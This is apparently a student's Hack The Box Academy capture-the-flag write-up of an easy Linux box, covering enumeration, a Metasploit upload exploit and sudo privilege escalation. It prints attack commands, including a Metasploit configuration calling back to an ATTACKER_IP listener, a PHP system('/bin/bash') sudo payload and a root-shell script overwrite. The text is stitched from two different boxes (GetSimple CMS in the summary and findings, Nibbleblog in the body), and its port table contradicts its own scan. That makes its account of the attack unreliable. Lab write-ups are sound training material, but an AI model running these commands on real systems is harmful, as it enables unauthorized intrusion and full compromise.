This Section is a full box, so i have completed it and included the write-up below

**Difficulty:** Easy
**OS:** Linux
**Date Completed:** 2026-09-04
**Write-up Authored by:** Ian Simons
**Challenge Created by:** mrb3n8132
**Core Competencies:**
- Network Enumeration with **Nmap**
- Manual Web Enumeration
- Web Enumeration with **Gobuster**
- Vulnerability Research
- Initial Access with **Metasploit**
- Privilege Enumeration
- Privilege Escalation

---
## Overview
This Box was completed as part of the Hack the Box Academy Job Role Path "Penetration Tester" in the "Getting Started" Module. The objective of this exercise was to have students complete a box on their own with little to no assistance. In addition to Completing the assessment, a personal objective was to reduce reliance on automated exploitation frameworks and tools (namely **Metaslpoit**) and develop a stronger understanding of the underlying exploitation process. Although **Metasploit** was ultimately used to achieve initial access. The exercise provided valuable insight into the vulnerability, exploitation, and workflow needed for manual exploitation.
Note: Flags documented in Appendix B

---
## Vulnerability summary

| Vulnerability                            | Vulnerability Classification                                      | CVSS Score    | MITRE ATT&CK Technique                                               | ATT&CK Tactic        |
| ---------------------------------------- | ----------------------------------------------------------------- | ------------- | -------------------------------------------------------------------- | -------------------- |
| Nibbleblog 4.0.3 - Arbitrary File Upload | CVE-2015-6967                                                     | 6.5 (CVSS v2) | T1190 - Exploit Public-Facing Application                            | Initial Access       |
| Weak Credentials                         | CWE - 521 - Weak Password Requirements                            | N/A           | T1078 - Valid Accounts                                               | Initial Access       |
| Writable Script Executable via Sudo      | CWE - 732 - Incorrect Permission Assignment for Critical Resource | N/A           | T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching | Privilege Escalation |

---
## Attack Path Summary
1. Performed network reconnaissance with **Nmap** and identified **OpenSSH 8.2p1** and **Apache HTTP Server 2.4.41** running on Ubuntu host
2. Conducted web application enumeration, and identified target application as **GetSimple CMS** 
3. Discovered exposed administrative account configuration file at **/data/users/admin.xml** which contained the username admin and an associated password hash
4. Determined the password hash utilized the SHA-1 hashing algorithm
5. Performed offline password cracking against the recovered hash recovering the plaintext password: **admin**
6. Authenticated to the **GetSimple CMS** administrative interface using recovered credentials and confirmed application was running version 3.3.15
7. Research identified **CVE-2019-11231** as viable attack path for achieving remote code execution 
8. Leveraged the **Metasploit** module **exploit/multi/http/getsimplecms_unauth_code_exec** to obtain remote code execution, resulting in initial access to the target system
9. Post-exploitation enumeration revealed that the compromised account possessed **NOPASSWD** sudo privileges for **/usr/bin/php**
10. Developed and executed a PHP-based privilege escalation payload via **/usr/bin/php** using the permitted sudo configuration
11. Leveraged Misconfigured sudo permissions to obtain root-level access and achieve full system compromise.
---
## Reconnaissance
### Port Discovery
Nmap scan results
```
# Nmap 7.95 scan initiated Fri Sep  4 11:34:10 2026 as: nmap -sV -sC -oA nmap/initial -vvv -p- 10.129.147.204
Nmap scan report for 10.129.147.204
Host is up, received syn-ack (0.067s latency).
Scanned at 2026-09-04 11:34:10 EDT for 33s
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyjE3IszCWTkwVItyz5yZxbgFhlqWM5o/4ZgDpPgt3QXKAawOgZbp7tSkTV7rVtI1pWlJf+o1c8Yo2MoIrlZVoYcKF3h35k12p+vzy3ZDqzF7jL2tJ95uYfk9WuKh1B8VLJegno2zkxYTzNzYGWrG1qkV61r2UjPYWzRVcHDRrNsxxgGpUF1AJcADWEModm3jpSksUGWUbgNqLoYTPYgFNBKeURrlABB8/ykIsqXLR3wVWIC5L8uslM4+qFGkCbdV+REUlBRzIdaC54lHeTF8JhShQnOuXgPdLp06slStSKcq+V/0gKhSDqm9TQITDNwglQm6ZkqQh0j0FaMt3GMwJB4N6eoGhceV3L7gOfmXd5UK2BYZqOOwiHTR6m+HIDKPdgOMTOCyDxVGCmuW6hu5GcOE0tO7ioU5p7vHTfw9jeyoCnXSNhpEY9JR2IKHlRaIPibfG1GUP0K09J/jaSCc2Eb2yW3r19V3F/6wI7iRbTyD3Hom90p0p6OyVKJyeh20=
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCL6NQmgxEaM6Pafc7ISrlPW491jht6Zf0Lvsb4P3DAbfT3j3h1fe74WgF2xG3FngdXDc40dkHVzfYpTqqCsNrU=
|   256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPfBXQPlIkQDU20q4l5MNZxG3ixQyUahJPci3gvdgKls
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-title: Welcome to GetSimple! - gettingstarted
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep  4 11:34:43 2026 -- 1 IP address (1 host up) scanned in 33.02 seconds


```

#### Key Open Ports and Services

| Port   | Service | Version             |
| ------ | ------- | ------------------- |
| 22/TCP | SSH     | OpenSSH 7.2p2       |
| 80/TCP | HTTP    | Apache httpd 2.4.41 |

### Web Enumeration 
During port and service Discovery, a **/robots.txt** file was flagged. Navigating to `http://10.129.147.204/robots.txt` revealed that an **/admin** page was available. `http://10.129.147.204/admin/` was the admin login portal. As no credentials had yet been identified, we ran a scan using **Gobuster** and found the following results
```
/.hta                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/admin                (Status: 301) [Size: 316] [--> http://10.129.147.204/admin/]
/backups              (Status: 301) [Size: 318] [--> http://10.129.147.204/backups/]
/data                 (Status: 301) [Size: 315] [--> http://10.129.147.204/data/]
/index.php            (Status: 200) [Size: 5485]
/plugins              (Status: 301) [Size: 318] [--> http://10.129.147.204/plugins/]
/robots.txt           (Status: 200) [Size: 32]
/server-status        (Status: 403) [Size: 279]
/sitemap.xml          (Status: 200) [Size: 431]
/theme                (Status: 301) [Size: 316] [--> http://10.129.147.204/theme/]

```

upon navigating to the **/data** directory we successfully identified **/data/user/admin.xml** which contained the username admin as well as the corresponding password hash `d033e22ae348aeb5660fc2140aec35850c4da997`. The Hash 
findings.txt
```
running GetSimple CMS
robots.txt only shows /admin/
going to /data/users/admin.xml yielded: admin:d033e22ae348aeb5660fc2140aec35850c4da997
d033.22... is a sha1 hash cracked in seconds password=admin
upon successful login, version 3.3.15 identified
identified cve 2019-111231
use metsploit module exploit/multi/http/getsimplecms_unauth_code_exec 
set rhost and lhost
initial access
sudo -l shows www-data can run /usr/bin/php as root without a password

write .php file in /tmp with contents
<?php system("/bin/bash"); ?>
sudo /usr/bin/php /tmp/test.php

root access achieved

```
Identified nibble blog version of 4.0.3 on **/nibbleblog/README** which was publicly accessible.
Identified username **admin** in the file **/nibbleblog/content/private/users.xml** which was publicly accessible.
### Vulnerability Research
Publicly Accessible page **/nibbleblog/README** identified Nibbleblog version 4.0.3. Research identified CVE-2015-6967 an arbitrary file upload vulnerability allowing remote code execution through the **my_image** plugin, and an existing **Metasploit** module.

---
## Initial Access
### Vulnerability Details
- Description: Nibbleblog 4.0.3 - Arbitrary File Upload, Weak Credentials
- Vulnerability Classification: CVE-2015-6967, CWE - 521 - Weak Password Requirements
- CVSS score: 6.5 (CVSS v2), N/A
- MITRE ATT&CK: Initial Access - T1190: Exploit Public-Facing Application, Initial Access - T1078: Valid Accounts

Nibble Blog 4.0.3 is vulnerable to an unrestricted file upload. This means that administrators can upload files with an executable extension which would then allow them to execute arbitrary code using a direct request to **/content/private/plugins/my_image/image.php**. There is an existing **Metasploit** Module for this vulnerability and as I am working to improve my **Metasploit skills** we will utilize this module.
#### Exploitation Steps
Based on the identified Nibble Blog 4.0.3 vulnerability we identified, the **Metasploit** module **exploit/multi/http/nibbleblog_file_upload** was selected because it specifically targets CVE-2015-6967. Only the username admin had been identified so far. Because the application enforced a strict login lockout policy, traditional password spraying or guessing attacks were not feasible. However, the machine name, application name, and username all revolved around the term "nibble", making "nibbles" a reasonable contextual password candidate. Authentication was successful using this credential. 

1. Launch Metasploit framework
2. Select module **exploit/multi/http/nibbleblog_file_upload** targeting CVE-2015-6967 
3. Configure target and callback parameters
4. Execute the exploit and obtain a remote session
#### Key Commands / Payloads
```
# launch Metasploit Framework console
msfconsole

# select appropriate exploit module
use exploit/multi/http/nibbleblog_file_upload

# set appropriate options for module
set PASSWORD nibbles
set RHOST <TARGET_IP>
set RPORT 80
set TARGETURI /nibbleblog/
set USERNAME admin
set LHOST <ATTACKER_IP>
set LPORT 4444

# run exploit
run
```

#### Proof of Access 
##### Screenshots
![InitialAccess.jpg](../../../Images/Nibbles/InitialAccess.jpg)
Figure 1: Proof of initial access. Successful exploitation of CVE-2015-6967 resulted in command execution on the target host. Session validated by confirming execution context, hostname, and operating system.
##### Session Validation Commands
```
#Check user context
whoami

#Verify target hostname
hostname

#Verify operating system version
 uname -a
```

---
## Privilege Escalation 
### Vulnerability Details
- Description: Writable Script Executable via Sudo
- Vulnerability Classification: CWE - 732 Sudo Misconfiguration 
- CVSS score: N/A
- MITRE ATT&CK:  Privilege Escalation - T1548.003: Abuse Elevation Control Mechanism: Sudo and Sudo caching

Enumeration of sudo privileges revealed that the user **nibbler** could execute **/home/nibbler/personal/stuff/monitor.sh** as root without providing a password. Because the user had write permissions within the script directory, it was possible to modify the script and execute arbitrary commands as root.
#### Exploitation Steps
1. Check current sudo privileges
2. Create required directories
3. Create malicious script
4. Change script permissions
5. Execute script with sudo and obtain root privileges
#### Key Commands / Payloads
```
# check current sudo privileges
sudo -l

# create necessary directories
mkdir -p /home/nibbler/personal/stuff

# create malicious script
echo "bash -c '/bin/bash'" > /home/nibbler/personal/stuff/monitor.sh

# change script permissions
chmod +x /home/nibbler/personal/stuff/monitor.sh

# run script as root
sudo /home/nibbler/personal/stuff/monitor.sh

# verify execution context
whoami

```

#### Proof of Privilege Escalation

![privEsc.jpg](../../../Images/Nibbles/privEsc.jpg) 
Figure 2: Proof of Privilege Escalation. Successful exploitation resulted in execution within the root security context. Privileges were validated by confirming the execution context with the `whoami` command.

---
## Lessons Learned 
This box really pushed me. While I did use **Gobuster** for some web directory enumeration, I still did plenty of manual Web Enumeration. This really helped build my Web Enumeration skills, as well as improve my confidence as I am still quite new to offensive security. The Privilege Escalation section also pushed me. However it was really cool to see examples covered in Academy used in the wild some key takeaways include:
- Findings, no matter how small, can lead lead to significant compromoze
- Make zero assumptions, nibble blog at first just seemed like the name of the blog, and I absent-mindedly assumed it was for longer than I would like to admit. 
- Slow down while performing Enumeration, don't rush or you may miss obvious opportunities
---
## Appendix
### Appendix A
#### Tools Used 
| Tool                 | Purpose                                                                       |
| -------------------- | ----------------------------------------------------------------------------- |
| Nmap                 | Network Reconnaissance, Service Discovery, and version detection              |
| SearchSploit         | Vulnerability research and exploit identification                             |
| Metasploit Framework | Exploitation, session management, post-exploitation, and privilege escalation |

### Appendix B
#### Flags found
![userFlag](../../../Images/Nibbles/userFlag.jpg)
User Flag:
700c\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*7d1

![rootflag](../../../Images/Nibbles/rootFlag.jpg)
Root Flag:
aa4\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*6e9

### Appendix C
#### Supporting Evidence
No additional supporting evidence was required beyond the artifacts included throughout this write-up